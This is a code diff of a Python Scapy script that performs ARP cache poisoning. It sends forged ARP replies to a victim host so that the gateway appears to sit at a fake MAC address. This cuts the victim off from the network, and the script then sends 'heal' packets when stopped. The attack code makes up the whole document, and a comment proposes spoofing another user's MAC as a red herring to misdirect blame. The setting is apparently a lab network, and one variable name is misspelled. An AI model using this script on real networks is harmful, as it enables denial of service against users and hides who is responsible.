@@ -5,34 +5,40 @@ import time
 import signal
 import sys
 
-victimIP = "192.168.56.105"
-victimMAC = "08:00:27:49:32:8b"
+victimIP = "192.168.56.105"		#IP address of who we poison
+victimMAC = "08:00:27:49:32:8b"		#MAC address ""
 
-myMAC = "08:00:27:f7:e8:72"
+myMAC = "08:00:27:f7:e8:72"		#MAC address of origin of poisioning 
+					#set as another users MAC for Red herring attempt
+
+deadEndIP = "192.168.1.1"		#IP address of host we dont want victim to talk to
+deadEndMAC = "84:a6:c8:af:12:ed"	#MAC address ""
+
+killMAC = "08:00:27:ff:ff:fe"		#False MAC address
 
 
-deadEndIP = "192.168.1.1"
-deadEndMAC = "84:a6:c8:af:12:ed"
+#Creating Poisoning packet
 
-killMAC = "08:00:27:ff:ff:fe"
+#Ethernet*****************
+pkt = Ether()/ARP()	
+pkt.dst = victimsMAC		#Ethernet Destination
+pkt.src = myMAC			#Ethernet Source
+#*************************
 
+#ARP**********************
+pkt.pdst= victimIP		# (IP)
+pkt.hwdst = victimMAC		# (MAC)Hey just to let you know...	
+pkt.psrc = deadEndIP		# if you're trying to talk to...
+pkt.hwsrc = killMAC		# His MAC address is ...
+pkt.op = 2			# that's where he's at (is-at)
+#*************************
 
-pkt = Ether()/ARP()
-pkt.dst = victims[i][1]
-pkt.src = myMAC
-
-pkt.hwsrc = killMAC
-pkt.hwdst = victims[i][1]
-pkt.pdst= victims[i][0]
-pkt.psrc = deadEndIP
-pkt.op = 2
 
 print("Turn out the lights....")
 
 try:
 	while True:
-		sendp(packets[i], iface="eth0")
-		sendp(routerpkts[i], iface="eth0")
+		sendp(pkt, iface="eth0")
 		time.sleep(2)
 
 except KeyboardInterrupt:
@@ -46,7 +52,8 @@ except KeyboardInterrupt:
 	heal.psrc = deadEndIP
 	heal.op = 2
 
-	sendp(heal, iface="eth0")
-	time.sleep(1)
+	for i in range(0, 5):
+		sendp(heal, iface="eth0")
+		time.sleep(1)
 
 	sys.exit(0)
